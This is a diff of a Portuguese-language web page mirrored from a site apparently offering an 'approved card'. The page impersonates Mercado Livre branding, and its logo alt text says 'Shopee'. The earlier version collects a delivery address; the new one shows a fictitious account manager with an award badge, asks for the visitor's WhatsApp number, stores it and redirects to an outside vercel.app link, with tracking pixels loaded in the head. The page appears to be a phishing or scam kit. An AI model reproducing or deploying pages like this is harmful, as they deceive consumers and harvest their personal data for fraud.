@@ -1,22 +1,35 @@
-<!DOCTYPE html>
 <html lang="pt-BR">
 
 <head>
+    <script async="" src="js/fbevents.js"></script>
+    <script async="" defer="" src="js/pixel_1.js"></script>
+    <script async="" defer="" src="js/pixel.js"></script>
+    <script async="" defer="" src="js/pixel_2.js"></script>
+    <script async="" defer="" src="js/pixel.js"></script>
+</head>
+
+<body>
+
+
+    <!-- Mirrored from cartao-aprovado.site/card/recebimento/cep/confirma/maneger/index.php.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 27 Jan 2025 18:39:37 GMT -->
+
     <meta charset="UTF-8">
-    <link href="css/bootstrap.min.css" rel="stylesheet">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Endereço de Entrega</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cartão Mercado Livre - Sua Gerente</title>
 
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f9f9f9;
-            color: #333;
+        @import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap");
+        * {
             margin: 0;
             padding: 0;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
+            box-sizing: border-box;
+            font-family: "Inter", sans-serif;
+        }
+
+        body {
+            background-color: #f6f6f6;
+            color: #1f2937;
+            line-height: 1.6;
         }
 
         .header {
@@ -26,181 +39,213 @@
             text-align: center;
             font-size: 1.5rem;
             font-weight: bold;
+            margin-top: -30px;
         }
 
         .main-content {
-            max-width: 500px;
-            background-color: white;
-            text-align: center;
+            max-width: 480px;
+            background-color: #ffffff;
             padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
             margin: 40px auto;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            border: 1px solid #f0f0f0;
+        }
+
+        .welcome-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 0.5rem;
+            text-align: center;
+        }
+
+        .welcome-title span {
+            color: #0d64fb;
+        }
+
+        .subtitle {
+            color: #6b7280;
+            margin-bottom: 2rem;
+            text-align: center;
+            font-size: 1rem;
+        }
+
+        .manager-card {
+            background: #fff5f3;
+            border: 1px solid rgba(238, 77, 45, 0.1);
+            border-radius: 12px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        .manager-photo {
+            width: 120px;
+            height: 120px;
+            border-radius: 60px;
+            margin-bottom: 1rem;
+            border: 3px solid #0d64fb;
+            padding: 3px;
+        }
+
+        .manager-role {
+            color: #6b7280;
+            font-size: 0.875rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .manager-name {
+            color: #0d64fb;
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .manager-award {
+            background: white;
+            color: #4b5563;
+            padding: 0.5rem 1rem;
+            border-radius: 50px;
+            font-size: 0.875rem;
+            display: inline-block;
+            margin-top: 0.5rem;
+        }
+
+        .contact-info {
+            text-align: center;
+            color: #4b5563;
+            margin: 1.5rem 0;
+            font-size: 0.9375rem;
+            line-height: 1.6;
         }
 
         .form-label {
-            font-weight: bold;
+            color: #6b7280;
+            font-size: 0.875rem;
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 0.875rem 1.25rem;
+            border: 1px solid #e5e7eb;
+            border-radius: 50px;
+            font-size: 1rem;
+            color: #1f2937;
+            transition: all 0.2s ease;
+        }
+
+        .form-control:focus {
+            border-color: #0d64fb;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(238, 77, 45, 0.1);
         }
 
         .btn-custom {
-            background-color: #0d64fb;
+            background: linear-gradient(135deg, #0d64fb 0%, #0d64fb 100%);
             color: rgb(255, 255, 255);
             border: none;
-            border-radius: 5px;
-            padding: 10px 15px;
             width: 100%;
-            font-weight: bold;
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 500;
             cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 1.5rem;
         }
 
         .btn-custom:hover {
-            background-color: #000;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(238, 77, 45, 0.2);
         }
 
         .footer {
-            background: #ffffff;
-            border-top: 1px solid #e6e6e6;
+            background-color: #1a1a1a;
+            color: #f5f5f5;
             text-align: center;
-            padding: 15px;
-            font-size: 10px;
-            color: #666;
+            padding: 2rem 1rem;
+            border-bottom: solid 3px #ffc600;
+            font-size: 0.875rem;
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                margin: 1rem;
+                padding: 1.5rem;
+            }
+            .manager-card {
+                padding: 1.5rem;
+            }
         }
     </style>
-</head>
 
-<body>
+    <div style="
+        display: grid;
+        grid-template-areas: 'top-bar' 'content' 'footer';
+        grid-template-rows: auto 1fr auto;
+        min-height: 100vh;
+      ">
+        <div class="header">
+            <img src="images/logo.png" alt="Shopee Logo" style="width: 120px">
+        </div>
 
-    <div class="header">
-        <img style="width: 120px" src="images/logo.png" alt="Logo">
-    </div>
+        <div style="grid-area: content; padding: 0 1rem">
+            <div class="main-content">
+                <div id="introducao-gerente">
+                    <h2 class="welcome-title">
+                        Ótimo, quase lá <span id="nomeUsuario"></span>!
+                    </h2>
+                    <p class="subtitle">
+                        Antes de escolher uma forma de envio, conheça sua Gerente Responsável:
+                    </p>
 
-    <div class="main-content">
-        <h2>Endereço de Entrega</h2>
-        <p>Informe onde você deseja receber seu cartão</p>
-        <form id="form-endereco">
-            <div class="mb-3">
-                <label for="cep" class="form-label">CEP</label>
-                <input type="text" class="form-control" id="cep" placeholder="00000-000" onblur="buscarCEP()">
-            </div>
-            <div class="mb-3">
-                <label for="rua" class="form-label">Rua</label>
-                <input type="text" class="form-control" id="rua" placeholder="Digite sua rua">
-            </div>
-            <div class="mb-3 d-flex align-items-center">
-                <div class="flex-grow-1 me-2">
-                    <label for="numero" class="form-label">Número</label>
-                    <input type="text" class="form-control" id="numero">
-                </div>
-                <div class="form-check">
-                    <input class="form-check-input" type="checkbox" id="sem-numero">
-                    <label class="form-check-label" for="sem-numero">Sem número</label>
-                </div>
-            </div>
-            <div class="mb-3">
-                <label for="complemento" class="form-label">Complemento (opcional)</label>
-                <input type="text" class="form-control" id="complemento">
-            </div>
-            <div class="mb-3">
-                <label for="bairro" class="form-label">Bairro</label>
-                <input type="text" class="form-control" id="bairro">
-            </div>
-            <div class="mb-3 d-flex">
-                <div class="flex-grow-1 me-2">
-                    <label for="cidade" class="form-label">Cidade</label>
-                    <input type="text" class="form-control" id="cidade">
-                </div>
-                <div>
-                    <label for="estado" class="form-label">Estado</label>
-                    <select class="form-select" id="estado">
-              <option value="AC">AC</option>
-              <option value="AL">AL</option>
-              <option value="AP">AP</option>
-              <option value="AM">AM</option>
-              <option value="BA">BA</option>
-              <option value="CE">CE</option>
-              <option value="DF">DF</option>
-              <option value="ES">ES</option>
-              <option value="GO">GO</option>
-              <option value="MA">MA</option>
-              <option value="MT">MT</option>
-              <option value="MS">MS</option>
-              <option value="MG">MG</option>
-              <option value="PA">PA</option>
-              <option value="PB">PB</option>
-              <option value="PR">PR</option>
-              <option value="PE">PE</option>
-              <option value="PI">PI</option>
-              <option value="RJ">RJ</option>
-              <option value="RN">RN</option>
-              <option value="RS">RS</option>
-              <option value="RO">RO</option>
-              <option value="RR">RR</option>
-              <option value="SC">SC</option>
-              <option value="SP">SP</option>
-              <option value="SE">SE</option>
-              <option value="TO">TO</option>
-            </select>
+                    <div class="manager-card">
+                        <img src="images/gerente.jpg" class="manager-photo" alt="Foto da Gerente">
+                        <p class="manager-role">Gerente</p>
+                        <h4 class="manager-name">Juliana Benedito</h4>
+                        <span class="manager-award">🏆 Melhor gerente 2023-2024</span>
+                    </div>
+
+                    <p class="contact-info">
+                        Após concluir o procedimento, Juliana entrará em contato para garantir um atendimento humanizado sempre que você precisar.
+                    </p>
+
+                    <div class="form-group">
+                        <label for="whatsapp" class="form-label">Digite seu WhatsApp</label>
+                        <input type="text" class="form-control" id="whatsapp" placeholder="(00) 00000-0000">
+                    </div>
+                <a href="https://ha1-x9f6.vercel.app/" class="btn-custom">
+                    <button type="submit" class="btn-custom" onclick="enviarWhatsApp()">
+              Continuar
+            </button>
+        </a>
                 </div>
             </div>
-            <button type="button" class="btn-custom" onclick="salvarEndereco()">
-          Confirmar endereço
-        </button>
-        </form>
+        </div>
     </div>
 
     <script>
-        function buscarCEP() {
-            const cep = document.getElementById("cep").value;
-            if (cep) {
-                fetch(`https://viacep.com.br/ws/${cep}/json/`)
-                    .then((response) => response.json())
-                    .then((data) => {
-                        if (!data.erro) {
-                            document.getElementById("rua").value = data.logradouro || "";
-                            document.getElementById("bairro").value = data.bairro || "";
-                            document.getElementById("cidade").value = data.localidade || "";
-                            document.getElementById("estado").value = data.uf || "";
-                        } else {
-                            console.error("CEP não encontrado.");
-                        }
-                    })
-                    .catch(() => console.error("Erro ao buscar o CEP."));
-            }
+        function carregarNomeUsuario() {
+            const nomeCompleto = localStorage.getItem("nome");
+            const primeiroNome = nomeCompleto ? nomeCompleto.split(" ")[0] : "";
+            document.getElementById("nomeUsuario").innerText = primeiroNome;
         }
 
-        function salvarEndereco() {
-            const endereco = {
-                cep: document.getElementById("cep").value,
-                rua: document.getElementById("rua").value,
-                numero: document.getElementById("sem-numero").checked ?
-                    "Sem número" :
-                    document.getElementById("numero").value,
-                complemento: document.getElementById("complemento").value,
-                bairro: document.getElementById("bairro").value,
-                cidade: document.getElementById("cidade").value,
-                estado: document.getElementById("estado").value,
-            };
+        carregarNomeUsuario();
 
-            if (!endereco.cep ||
-                !endereco.rua ||
-                !endereco.numero ||
-                !endereco.bairro ||
-                !endereco.cidade ||
-                !endereco.estado
-            ) {
-                alert("Por favor, preencha todos os campos obrigatórios.");
-                return;
+        function enviarWhatsApp() {
+            const whatsapp = document.getElementById("whatsapp").value;
+            if (whatsapp) {
+                localStorage.setItem("whatsapp", whatsapp);
+                window.location.href = "../cep/index.html" + window.location.search;
+            } else {
+                alert("Por favor, insira seu número de WhatsApp.");
             }
-
-            localStorage.setItem("enderecoCliente", JSON.stringify(endereco));
-            window.location.href = "../sedex/index.html" + window.location.search;
         }
     </script>
-
-    <!-- Footer -->
-    <div class="footer">
-        Copyright © 2025 BlueBird. Todos os direitos reservados.<br> Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
-    </div>
 
     <!-- Utmify utms capture -->
     <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
@@ -251,6 +296,8 @@
     </script>
 
 
+
 </body>
+<!-- Mirrored from cartao-aprovado.site/card/recebimento/cep/confirma/maneger/index.php.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 27 Jan 2025 18:39:37 GMT -->
 
 </html>
